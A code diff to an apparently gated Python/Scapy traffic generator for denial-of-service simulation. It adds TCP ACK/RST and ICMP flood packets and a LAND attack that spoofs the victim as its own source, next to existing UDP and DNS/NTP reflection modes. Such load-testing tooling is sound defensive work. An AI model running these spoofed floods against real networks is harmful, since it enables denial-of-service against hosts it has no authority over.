@@ -84,6 +84,15 @@ def build_packet(protocol: str, src: str, dst: str, dst_port: Optional[int], siz
     if protocol == "tcp_syn":
         return IP(src=src, dst=dst) / TCP(sport=rng.randint(1024, 65535), dport=dst_port or 80, flags="S",
                                           seq=rng.randint(0, 2**32 - 1))
+    if protocol in ("tcp_ack", "tcp_rst"):
+        return IP(src=src, dst=dst) / TCP(sport=rng.randint(1024, 65535), dport=dst_port or 80,
+                                          flags="A" if protocol == "tcp_ack" else "R",
+                                          seq=rng.randint(0, 2**32 - 1), ack=rng.randint(0, 2**32 - 1))
+    if protocol == "icmp":
+        return IP(src=src, dst=dst) / ICMP(type=8, id=rng.randint(0, 65535), seq=rng.randint(0, 65535)) / pad(size - 28)
+    if protocol == "land":  # source == destination (IP and port): the victim appears to talk to itself
+        port = dst_port or 80
+        return IP(src=dst, dst=dst) / TCP(sport=port, dport=port, flags="S", seq=rng.randint(0, 2**32 - 1))
     if protocol in ("udp", "udp_reflection", "dns_reflection"):
         sport = {"udp_reflection": 123, "dns_reflection": 53}.get(protocol, rng.randint(1024, 65535))
         dport = dst_port if protocol == "udp" else rng.randint(1024, 65535)
@@ -156,7 +165,7 @@ class GatedTrafficRunner:
                         if due > now:
                             self.sleep(min(due - now, BATCH_S))
                             continue
-                        src = self.rng.choice(sources)
+                        src = target if p.protocol == "land" else self.rng.choice(sources)  # LAND spoofs the victim
                         self._guard(src, target, target)
                         if p.protocol == "http":
                             if self.rng.random() < 0.2:  # ~1 request per 5 packets of rate budget
